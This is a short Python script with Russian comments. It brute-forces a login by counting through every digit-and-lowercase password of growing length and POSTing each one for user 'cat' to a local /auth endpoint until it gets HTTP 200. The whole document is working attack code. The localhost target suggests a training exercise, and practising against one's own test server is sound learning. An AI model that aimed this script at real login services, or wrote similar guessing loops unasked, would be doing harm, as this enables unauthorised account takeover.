import requests

k = 0  # длина пароля
counter = 0  # текущий шаг в 10й системе счисления

alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
base = len(alphabet)

while True:
    password = ''  # строка с паролем == counter в системе счисления с основанием base

    i = counter
    while i > 0:
        r = i % base
        password = alphabet[r] + password
        i = i // base

    password = alphabet[0] * (k - len(password)) + password

    print(counter, password)
    response = requests.post('http://127.0.0.1:5000/auth',
                             json={'login': 'cat', 'password': password})
    if response.status_code == 200:
        print('SUCCESS, password', password)
        break

    counter += 1
    if password == alphabet[-1] * k:  # максимальный пароль для текущей длины достигнут
        k += 1
        counter = 0
